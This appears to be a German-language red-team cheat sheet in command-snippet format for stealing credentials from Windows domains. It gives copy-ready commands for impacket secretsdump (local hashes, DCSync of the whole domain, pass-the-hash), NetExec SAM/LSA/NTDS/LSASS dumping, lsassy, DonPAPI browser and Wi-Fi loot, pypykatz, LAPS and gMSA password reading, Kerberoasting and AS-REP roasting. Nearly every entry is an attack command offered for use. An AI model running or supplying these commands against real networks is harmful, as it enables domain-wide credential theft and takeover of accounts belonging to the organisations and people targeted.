# MENU

#plateform/linux #target/remote #cat/CREDS

% p-creds, boris, dump, credentialdumping, secretsdump, impacket, sam, lsa, security, host
## [CREDS-a] impacket-secretsdump - Host lokal (SAM+LSA+SECURITY, braucht Admin)
Lokale Konten+Secrets eines Hosts. target IP ok (NTLM). PtH: -hashes :<nthash> statt Passwort.
```
impacket-secretsdump '<domain>/<user>:<password>@<target_fqdn>'
```

% p-creds, boris, dump, dcsync, secretsdump, impacket, ntds, justdc, drsuapi, domain
## [CREDS-b] impacket-secretsdump - DCSync ganze Domain (NTDS via DRSUAPI)
DA/DCSync-Rechte. -just-dc-ntlm = nur Hashes. -just-dc-user krbtgt = gezielt (tippe persist). Kerberos -> dc_fqdn+domain FQDN.
```
impacket-secretsdump -just-dc '<domain>/<user>:<password>@<dc_fqdn>'
```

% p-creds, boris, dump, secretsdump, impacket, pth, passthehash, nthash
## [CREDS-c] impacket-secretsdump - Pass-the-Hash (statt Passwort)
```
impacket-secretsdump -hashes :<nthash> '<domain>/<user>@<target_fqdn>'
```

% p-creds, boris, dump, nxc, sam, lsa, netexec, multihost
## [CREDS-d] nxc - SAM + LSA auf vielen Hosts (Admin noetig)
```
nxc smb <target_range> -u <user> -p '<password>' -d <domain> --sam --lsa
```

% p-creds, boris, dump, nxc, ntds, netexec, dc, dcsync
## [CREDS-e] nxc - NTDS dumpen (auf DC, DA-Rechte)
```
nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> --ntds
```

% p-creds, boris, dump, nxc, lsassy, nanodump, procdump, handlekatz, lsass, module
## [CREDS-f] nxc - LSASS via Modul (lsassy Default; alt nanodump/procdump/handlekatz)
```
nxc smb <target_range> -u <user> -p '<password>' -d <domain> -M lsassy
```

% p-creds, boris, dump, lsassy, lsass, remote, multihost
## [CREDS-g] lsassy - LSASS remote parsen (viele Hosts)
```
lsassy -d <domain> -u <user> -p '<password>' <target_range>
```

% p-creds, boris, dump, donpapi, dpapi, loot, browser, wifi, vault, masse
## [CREDS-h] DonPAPI - DPAPI-Loot massenhaft (Browser/Wifi/Vaults/Creds)
PtH: -H :<nthash>. Loot landet in ~/.donpapi/loot/ ; donpapi gui zum Browsen.
```
donpapi collect -d <domain> -u <user> -p '<password>' -t <target_range>
```

% p-creds, boris, dump, pypykatz, offline, minidump, lsass, parse
## [CREDS-i] pypykatz - offline LSASS-Dump parsen (lsass.DMP)
```
pypykatz lsa minidump <dumpfile|lsass.DMP>
```

% p-creds, boris, dump, laps, nxc, ldap, localadmin, klartext
## [CREDS-j] nxc - LAPS lesen (lokale Admin-Passwoerter im Klartext)
```
nxc ldap <dc_ip> -u <user> -p '<password>' -d <domain> -M laps
```

% p-creds, boris, dump, gmsa, nxc, ldap, serviceaccount
## [CREDS-k] nxc - gMSA-Passwoerter lesen
```
nxc ldap <dc_ip> -u <user> -p '<password>' -d <domain> --gmsa
```

% p-creds, boris, kerberoast, roasting, getuserspns, impacket, spn, tgs
## [CREDS-l] Kerberoast - SPN-Konten-Hashes (impacket-GetUserSPNs, offline cracken)
Braucht irgendeinen gueltigen Cred. -request holt die TGS-Hashes; mit hashcat -m 13100 cracken.
```
impacket-GetUserSPNs -request -dc-host <dc_fqdn> '<domain>/<user>:<password>'
```

% p-creds, boris, asrep, asreproast, roasting, getnpusers, impacket, preauth
## [CREDS-m] AS-REP Roast - Konten ohne Pre-Auth (impacket-GetNPUsers, hashcat -m 18200)
Mit Cred: findet DONT_REQ_PREAUTH-Konten. Ohne Cred: -no-pass + -usersfile.
```
impacket-GetNPUsers -request -dc-host <dc_fqdn> -format hashcat '<domain>/<user>:<password>'
```
